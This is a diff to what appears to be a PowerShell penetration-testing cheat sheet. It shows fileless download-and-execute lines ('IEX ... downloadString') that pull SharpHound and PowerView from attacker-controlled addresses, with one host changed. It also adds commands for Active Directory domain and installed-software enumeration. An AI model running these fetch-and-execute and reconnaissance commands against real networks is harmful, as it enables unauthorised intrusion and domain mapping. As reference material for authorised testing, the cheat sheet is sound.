@@ -30,7 +30,7 @@ powershell iex (New-Object Net.WebClient).DownloadString('http://10.2.3.85/Invok
 ## Fileless (Running PS1 without saving to disk)
 ```
 IEX(New-Object Net.WebClient).downloadString('http://10.10.16.4/SharpHound.ps1')
-IEX(New-Object Net.WebClient).downloadString('http://10.10.16.4/PowerView.ps1')
+IEX(New-Object Net.WebClient).downloadString('http://192.168.10.1:8000/PowerView.ps1')
 ```
 
 ## Fileless (Run and Execute)
@@ -194,6 +194,12 @@ get-ciminstance win32_product | fl
 ## Get a list of Installed Software (exclude Microsoft)
 ```
 get-ciminstance win32_product -Filter "NOT Vendor like '%Microsoft%'" | fl
+```
+
+## Get Current AD Domain
+```
+$ADClass = [System.DirectoryServices.ActiveDirectory.Domain]
+$ADClass::GetCurrentDomain()
 ```
 
 ## Get-ADUser
